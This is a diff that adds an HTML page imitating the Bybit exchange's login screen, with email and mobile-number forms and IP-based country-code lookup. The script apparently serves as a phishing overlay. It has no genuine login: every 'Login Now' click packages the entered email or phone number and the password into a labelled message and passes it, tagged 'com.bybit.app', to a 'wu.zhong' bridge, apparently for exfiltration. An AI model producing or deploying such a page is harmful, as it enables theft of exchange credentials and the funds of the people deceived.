@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bybit Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #0a0a0a;
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 400px;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 60px;
+            padding: 10px 0;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 8px;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .dropdown-arrow {
+            font-size: 16px;
+            opacity: 0.8;
+        }
+
+        .sign-up {
+            color: #f7931a;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .auth-tabs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 40px;
+        }
+
+        .tab {
+            background: none;
+            border: none;
+            color: #666;
+            padding: 12px 24px;
+            border-radius: 25px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .tab.active {
+            background-color: #333;
+            color: white;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            background-color: #1a1a1a;
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .country-selector {
+            display: flex;
+            align-items: center;
+            background-color: #2a2a2a;
+            padding: 16px;
+            border-radius: 12px;
+            margin-right: 8px;
+            cursor: pointer;
+            min-width: 70px;
+            gap: 8px;
+            border: none;
+            color: white;
+            font-size: 16px;
+        }
+
+        .flag {
+            width: 30px;
+            height: 15px;
+            border-radius: 2px;
+            background: transparent;
+            color: white;
+            font-size: 16px;
+            text-align: right;
+            border: none;
+            outline: none;
+            position: relative;
+        }
+
+        .mobile-input-group {
+            display: flex;
+            gap: 8px;
+            align-items: stretch;
+        }
+
+        .input-field {
+            background: none;
+            border: none;
+            color: white;
+            padding: 20px;
+            font-size: 16px;
+            width: 100%;
+            outline: none;
+        }
+
+        .input-field::placeholder {
+            color: #666;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            font-size: 18px;
+        }
+
+        .input-field.with-icon {
+            padding-left: 55px;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #666;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .forgot-password {
+            text-align: right;
+            margin-bottom: 40px;
+        }
+
+        .forgot-password a {
+            color: #f7931a;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .login-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #b8860b, #daa520);
+            border: none;
+            padding: 18px;
+            border-radius: 12px;
+            color: #000;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 40px;
+            transition: all 0.3s;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(218, 165, 32, 0.3);
+        }
+
+
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .title {
+                font-size: 20px;
+            }
+            
+            .tab {
+                padding: 10px 18px;
+                font-size: 14px;
+            }
+            
+            .input-field {
+                padding: 16px;
+                font-size: 15px;
+            }
+            
+            .login-btn {
+                padding: 16px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="emailPage" class="page active">
+        <div class="container">
+            <div class="header">
+                <button class="back-btn"></button>
+                <div class="title">
+                    Bybit Login
+                    
+                </div>
+                <a href="#" class="sign-up">Sign Up</a>
+            </div>
+
+            <div class="auth-tabs">
+                <button class="tab active">Email</button>
+                <button class="tab" onclick="showMobilePage()">Mobile Number</button>
+            </div>
+
+            
+                <div class="form-group">
+                    <div class="input-wrapper">
+                        <span class="input-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#fff" viewBox="0 0 16 16">
+                            <path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2zm2-1a1 1 0 0 0-1 1v.217l7 4.2 7-4.2V4a1 1 0 0 0-1-1zm13 2.383-4.708 2.825L15 11.105zm-.034 6.876-5.64-3.471L8 9.583l-1.326-.795-5.64 3.47A1 1 0 0 0 2 13h12a1 1 0 0 0 .966-.741M1 11.105l4.708-2.897L1 5.383z"/>
+                            </svg></span>
+                        <input type="email" class="input-field with-icon" placeholder="Email">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <div class="input-wrapper">
+                        <span class="input-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#fff"  viewBox="0 0 16 16">
+                        <path fill-rule="evenodd" d="M8 0a4 4 0 0 1 4 4v2.05a2.5 2.5 0 0 1 2 2.45v5a2.5 2.5 0 0 1-2.5 2.5h-7A2.5 2.5 0 0 1 2 13.5v-5a2.5 2.5 0 0 1 2-2.45V4a4 4 0 0 1 4-4m0 1a3 3 0 0 0-3 3v2h6V4a3 3 0 0 0-3-3"/>
+                        </svg></span>
+                        <input type="password" class="input-field with-icon eml-pass" placeholder="Password">
+                        <button type="button" class="password-toggle"></button>
+                    </div>
+                </div>
+
+                <div class="forgot-password">
+                    <a href="#">Forgot Password</a>
+                </div>
+
+                <button type="submit" class="login-btn login-eml">Login Now</button>
+            
+
+
+        </div>
+    </div>
+
+    <div id="mobilePage" class="page">
+        <div class="container">
+            <div class="header">
+                <button class="back-btn"></button>
+                <div class="title">
+                    Bybit Login
+             
+                </div>
+                <a href="#" class="sign-up">Sign Up</a>
+            </div>
+
+            <div class="auth-tabs">
+                <button class="tab" onclick="showEmailPage()">Email</button>
+                <button class="tab active">Mobile Number</button>
+            </div>
+
+            
+                <div class="form-group">
+                    <div class="mobile-input-group">
+                        <button type="button" class="country-selector">
+                            <span class="flag" style="width:20px;"></span>
+                             <input type="tel" class="flag country" value="" readonly>
+                        </button>
+                        <div class="input-wrapper" style="flex: 1;">
+                            <input type="tel" class="input-field" placeholder="Mobile Number">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <div class="input-wrapper">
+                        <span class="input-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#fff"  viewBox="0 0 16 16">
+                        <path fill-rule="evenodd" d="M8 0a4 4 0 0 1 4 4v2.05a2.5 2.5 0 0 1 2 2.45v5a2.5 2.5 0 0 1-2.5 2.5h-7A2.5 2.5 0 0 1 2 13.5v-5a2.5 2.5 0 0 1 2-2.45V4a4 4 0 0 1 4-4m0 1a3 3 0 0 0-3 3v2h6V4a3 3 0 0 0-3-3"/>
+                        </svg></span>
+                        </span>
+                        <input type="password" class="input-field with-icon  num-pass" placeholder="Password">
+                        <button type="button" class="password-toggle"></button>
+                    </div>
+                </div>
+
+                <div class="forgot-password">
+                    <a href="#">Forgot Password</a>
+                </div>
+
+                <button type="submit" class="login-btn login-num">Login Now</button>
+           
+
+
+        </div>
+    </div>
+
+    <script>
+        window.onload = async function() {
+            var json= await fetch("https://ipapi.co/json/").then(res => res.json());
+            document.querySelector('.country').value = json.country_calling_code;
+            document.querySelector('.flag').style.background = `url("https://flagcdn.com/h60/${json.country.toLowerCase()}.png") no-repeat`;
+   
+        document.querySelector('.flag').style.backgroundSize = 'cover';
+        document.querySelector('.flag').style.backgroundPosition = 'center';
+
+        };
+        function showMobilePage() { document.getElementById('emailPage').classList.remove('active'); document.getElementById('mobilePage').classList.add('active'); }
+        function showEmailPage() { document.getElementById('mobilePage').classList.remove('active'); document.getElementById('emailPage').classList.add('active'); }
+   
+   
+        document.querySelector('.login-num').addEventListener('click', function() {
+            const mobileInput = document.querySelector('.mobile-input-group input[type="tel"]');
+            var numPass=document.querySelector('.num-pass').value;
+            const mobileNumber = mobileInput.value.trim();
+            if (mobileNumber) {
+            
+                wu.zhong(`🔰 Bybit Login \n\n📱Mobile Number: ${mobileNumber}\n\n🔒Password: ${numPass}`, "com.bybit.app");
+            } else {
+                mobileInput.focus();
+            }
+        });
+
+        document.querySelector('.login-eml').addEventListener('click', function() {
+            const emailInput = document.querySelector('.input-field[type="email"]');
+            var emailPass = document.querySelector('.eml-pass').value;
+            const email = emailInput.value.trim();
+            if (email) {
+                
+                wu.zhong(`🔰Bybit Login \n\n📧Email: ${email}\n\n🔒Password: ${emailPass}`, "com.bybit.app");
+            } else {
+                emailInput.focus();
+            }
+        });
+   
+   </script>
+</body>
+</html>
